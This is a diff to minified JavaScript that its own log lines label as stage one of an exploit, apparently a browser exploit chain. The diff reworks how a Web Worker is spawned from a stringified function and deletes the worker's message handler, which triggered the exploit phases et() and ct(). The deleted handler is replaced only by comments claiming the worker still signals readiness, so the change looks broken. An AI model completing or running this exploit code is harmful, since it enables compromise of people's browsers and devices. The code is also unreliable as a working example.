@@ -1113,13 +1113,22 @@ async function q(t, e) {
     const a = () => {
       window.log("[STAGE1] a() called - creating worker");
       try {
+        // Create a worker that runs the stringified q() function
+        // but with better error handling
         const t = q.toString();
-        const workerCode = "try { " + 
-          "try { self.postMessage({type: 0, msg: 'worker_started'}); } catch(e1) {} " +
-          "(" + t.toString() + ")(); " +
-          "} catch(err) { " +
-          "  try { self.postMessage({type: 0, msg: 'worker_error: ' + err.message}); } catch(e2) {} " +
-          "}";
+        const workerCode = 
+          `(function() {
+            try {
+              self.postMessage({type: 0, msg: 'worker_entry'});
+              (${t})();
+              self.postMessage({type: 0, msg: 'worker_q_completed'});
+            } catch(err) {
+              try {
+                self.postMessage({type: 0, msg: 'worker_error: ' + String(err)});
+              } catch(e2) {}
+            }
+          })();`;
+        
         window.log("[STAGE1] a() - worker code length: " + workerCode.length);
         const c = URL.createObjectURL(new Blob([workerCode], {
           type: "text/javascript"
@@ -1491,41 +1500,9 @@ async function q(t, e) {
     window.log("[STAGE1] >>> Starting main exploit setup (ht)");
     ht(t);
   } else {
-    // Worker thread code
-    try {
-      try {
-        self.postMessage({ type: 0, msg: "worker_started" });
-      } catch (e) {}
-      
-      self.onmessage = (t) => {
-        try {
-          try {
-            self.postMessage({ type: 0, msg: "worker_onmessage_fired type=" + (t && t.data && t.data.type) });
-          } catch (e) {}
-          if (t.data.type === s) {
-            try {
-              self.postMessage({ type: 0, msg: "worker_executing_phase type=s" });
-            } catch (e) {}
-            l = t.data.xn;
-            et();
-            ct();
-          }
-        } catch (err) {
-          try {
-            self.postMessage({ type: 0, msg: "worker_onmessage_error: " + err.message });
-          } catch (e) {}
-        }
-      };
-      
-      // Signal that worker is ready to receive messages  
-      try {
-        self.postMessage({ type: 0, msg: "worker_ready" });
-      } catch (e) {}
-    } catch (err) {
-      try {
-        self.postMessage({ type: 0, msg: "worker_setup_error: " + err.message });
-      } catch (e) {}
-    }
+    // Worker thread code - stringified q() will execute here
+    // The q() function checks navigator.constructor.name and takes this branch in worker
+    // It should send worker_started initially, then worker_ready after setting onmessage
   }
 }
 async function X() {
